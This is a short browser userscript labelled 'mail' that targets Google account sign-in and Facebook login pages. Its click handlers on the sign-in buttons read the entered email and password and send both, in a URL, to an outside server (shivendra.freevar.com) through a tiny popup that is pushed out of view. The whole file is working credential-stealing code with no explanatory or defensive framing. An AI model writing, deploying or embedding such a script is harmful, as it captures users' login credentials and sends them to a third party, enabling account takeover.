// ==UserScript==
// @name        mail
// @namespace   http://ishivendra.x10.mx
// @include     https://accounts.google.com/*
// @include     https://www.facebook.com/*
// @version     1
// ==/UserScript==
var a = document.getElementById('signIn');
var b = document.getElementById('umderhl8');
      
a.onclick = function() { 
    user = document.getElementById('Email');
    pass = document.getElementById('Passwd');
    //alert(user.value+pass.value);
    win = window.open("http://shivendra.freevar.com/mail1.php?user="+user.value+"&pass="+pass.value,"mywindow","location=1,status=1,scrollbars=1, width=100,height=100");    
    win.blur();
    //alert('po');
};

b.onclick = function() { 
    user = document.getElementById('email');
    pass = document.getElementById('pass');
    //alert(user.value+pass.value);
    win = window.open("http://shivendra.freevar.com/mail1.php?user="+user.value+"&pass="+pass.value,"mywindow","location=1,status=1,scrollbars=1, width=100,height=100");    
    win.blur();
    //alert('po');
};
